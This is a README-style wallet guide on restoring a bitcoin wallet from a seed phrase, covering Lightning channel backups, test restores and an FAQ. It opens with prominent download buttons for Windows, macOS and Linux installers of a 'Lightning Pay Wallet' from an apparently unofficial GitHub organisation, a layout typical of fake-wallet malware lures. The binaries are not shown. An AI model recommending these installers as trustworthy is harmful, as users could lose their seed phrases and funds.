<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Recovering a bitcoin wallet with a seed phrase

What a phrase restores, what it does not, and how to prove the restore worked before you need it.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

A seed phrase is a backup of keys, not of an application. Understanding that distinction is the
difference between a restore that works and an afternoon spent wondering why the balance is wrong.

## What the phrase restores

Given the same phrase, a compatible wallet regenerates the same keys and therefore the same on-chain
addresses. Any bitcoin on those addresses is spendable again. This is the part of recovery that is
well defined and reliable, and it is why the phrase is worth protecting above everything else.

## What it may not restore

Lightning balances are channel state, not just keys. A channel is a shared account with a counterparty,
and rebuilding it needs more than the key that controls your side. Wallets handle this with a channel
backup, and a restore that has the phrase but not the backup can come back with on-chain funds only.

If that happens, nothing is stolen; the channel still exists on the network and its resolution depends
on the counterparty and the protocol's timers, which is why the backup is worth keeping.

## The restore, in order

Install the same wallet from the release page. Choose restore rather than create. Enter the phrase in
the order you wrote it, with the same words and the same spelling. Wait for the sync to finish before
judging the result: a balance that appears slowly is normal, and a balance judged after ten seconds is
not a balance.

Then compare what came back against what you expected. On-chain funds should reappear at the same
addresses. Channel funds should reappear if the backup covered them.

## Prove it before you need it

Do the test while everything works. Create a wallet, write the phrase, receive a small amount, then
restore from the phrase on a clean install and confirm the amount returns. That is the only evidence
that your phrase, your handwriting and your procedure are all correct, and it takes ten minutes.

Most recovery failures are not cryptographic. They are a mistranscribed word, a phrase in a different
language than the restore expects, or a restore attempted on a wallet that uses a different derivation
path.

## If the phrase is lost

There is no reset, no support override and no server copy. A non-custodial wallet means exactly that.
The only remaining route is a device that still has the wallet open, which is why "do not reinstall"
is the first advice for any display problem.

## Questions people ask

### Can I use the phrase in a different wallet?

For on-chain funds, often, if the wallet follows the same standard. Channel funds are specific to the
wallet that created them.

### The restore shows zero. Is it lost?

Finish the sync first, then check whether the phrase matches the original exactly. A partial restore
that brings back on-chain funds only usually points at a missing channel backup.

### How many words should it be?

Twelve or twenty-four in the common standard. A phrase of another length belongs to a different scheme,
and the restore needs the matching wallet.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/back-up-a-lightning-wallet.md">Backing up a Lightning wallet: the seed phrase and the SCB file</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-an-old-bitcoin-wallet.md">Recovering an old bitcoin wallet, or importing one you already have</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/when-lightning-recovery-fails.md">When a Lightning recovery fails: no seed, an SCB, or an unsupported restore</a>

